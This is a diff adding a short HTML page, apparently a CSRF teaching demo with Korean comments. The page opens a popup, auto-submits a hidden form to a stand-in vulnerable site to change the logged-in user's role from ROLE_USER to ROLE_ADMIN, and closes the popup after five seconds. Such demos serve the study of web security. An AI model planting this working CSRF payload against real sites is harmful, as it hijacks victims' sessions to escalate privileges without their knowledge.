@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ko">
+<header>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</header>
+<body>
+<div>
+    <p>
+        CSRF 공격을 위한 악성 페이지다.
+        <br/>
+        CSRF 공격에 취약한 애플리케이션의
+        로그인 한 사용자의 역할이
+        <b>ROLE_USER</b>에서
+        <b>ROLE_ADMIN</b>으로 변경된다.
+    </p>
+    <form action="http://not-secure.com:8080/users"
+          method="post"
+          target="new-window"> <!-- 1 -->
+        <input type="hidden" name="role" value="ROLE_ADMIN"/>
+    </form>
+    <script>
+        const newWindow = window.open(
+            "",
+            "new-window",
+            'width=300,height=300'
+        ); // 2
+        if (newWindow) {
+            document.forms[0].submit(); // 3
+            setTimeout(() => { // 4
+                newWindow.close()
+            }, 5000)
+        }
+    </script>
+</div>
+</body>
+</html>
